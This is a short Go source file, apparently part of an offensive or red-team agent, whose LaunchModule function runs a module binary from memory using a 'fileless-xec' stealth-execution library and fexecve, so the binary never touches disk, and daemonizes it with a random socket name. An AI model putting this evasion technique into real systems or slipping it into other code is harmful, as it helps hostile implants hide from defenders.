//go:build !windows
// +build !windows

package agent

import (
	"os"

	"github.com/ariary/fileless-xec/pkg/exec"
	encryption "github.com/ariary/go-utils/pkg/encrypt"
)

//LaunchModule: execute module (not write into disk if on linux or macOS)
func LaunchModule(moduleBinaryContent string) (socketName string) {
	mfd := exec.PrepareStealthExec(moduleBinaryContent)
	defer mfd.Close()
	fd := mfd.Fd()

	socketName = SOCKET + "." + encryption.GenerateRandom()
	os.Setenv(COCO_SOCKET_ENVVAR, socketName)
	environ := os.Environ()
	exec.FexecveDaemon(fd, nil, environ)
	//Fexecve(fd, cfg.ArgsExec, cfg.Environ) //all line after that won't be executed due to syscall execve;
	return socketName
}
